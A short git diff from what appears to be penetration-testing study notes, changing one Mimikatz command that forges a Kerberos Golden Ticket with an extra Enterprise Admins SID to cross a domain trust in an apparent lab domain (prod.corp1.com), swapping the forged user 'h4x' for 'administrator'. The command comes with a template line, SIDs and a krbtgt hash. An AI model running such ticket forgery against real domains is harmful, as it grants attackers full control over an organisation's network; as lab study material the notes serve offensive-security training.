@@ -1048,7 +1048,7 @@ nslookup appsrv01
 * Forge a Golden Ticket with Extra SIDs
   *   ```powershell
       # kerberos::golden /user:<FakeUser> /domain:<OriginDomain> /sid:<OriginDomainSID> /krbtgt:<krbtgtHash> /sids:<RootDomainSID>-519 /ptt
-      kerberos::golden /user:h4x /domain:prod.corp1.com /sid:S-1-5-21-3776646582-2086779273-4091361643 /krbtgt:4b6af2bf64714682eeef64f516a08949 /sids:S-1-5-21-1095350385-1831131555-2412080359-519 /ptt
+      kerberos::golden /user:administrator /domain:prod.corp1.com /sid:S-1-5-21-3776646582-2086779273-4091361643 /krbtgt:4b6af2bf64714682eeef64f516a08949 /sids:S-1-5-21-1095350385-1831131555-2412080359-519 /ptt
       ```
 
 
